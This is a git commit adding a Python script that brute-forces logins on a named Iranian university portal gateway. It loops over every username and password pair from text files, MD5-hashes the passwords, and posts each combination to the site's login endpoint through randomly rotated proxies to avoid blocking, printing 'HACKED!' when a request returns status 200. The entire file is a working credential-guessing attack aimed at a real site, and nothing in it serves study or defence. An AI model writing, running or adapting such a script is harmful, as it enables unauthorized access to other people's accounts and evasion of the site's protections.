69fd866efb787c8318c60e1e070aec7b861bc883
Ali Bahaari <alibahaari1997@gmail.com>
2021-09-06 23:19:18 +0430

    Renamed Texts, Added Auto Proxies and Used Function for Running the Script

---
+++ main.py
@@ -0,0 +1,47 @@
+# Modules
+
+import requests, hashlib
+from proxy_list import ProxyList
+
+
+# Read Files
+
+usernames_file = [every_line.strip('\n') for every_line in open('Usernames.txt', 'r')]
+passwords_file = [every_line.strip('\n') for every_line in open('Passwords.txt', 'r')]
+
+
+# Convert Passwords to MD5
+
+def convert_to_md5(password):
+    return hashlib.md5(password.encode('UTF-8')).hexdigest()
+
+
+# Correspond Usernames and Passwords
+
+def correspond_data(username, password):
+
+    proxy_list = ProxyList()
+
+    data = dict(UserPassword=convert_to_md5(password), pswdStatus='mediocre', UserID=username, DummyVar='')
+
+    try:
+        request = requests.post('http://puya.ubahar.ir/gateway/UserInterim.php', data=data, proxies=proxy_list.get_random_proxy())
+
+        if request.status_code == 200:
+            print(username + ' - ' + password + ' - HACKED!')
+        else:
+            print('HTTP Code Error : ' + username + ' - ' + password)
+
+
+    except:
+        print('Proxy Error : ' + username + ' - ' + password)
+
+
+# Run Requests
+
+def run_requests():
+    print("Wait...")
+
+    for checking_username in usernames_file:
+        for checking_password in passwords_file:
+            correspond_data(checking_username, checking_password)
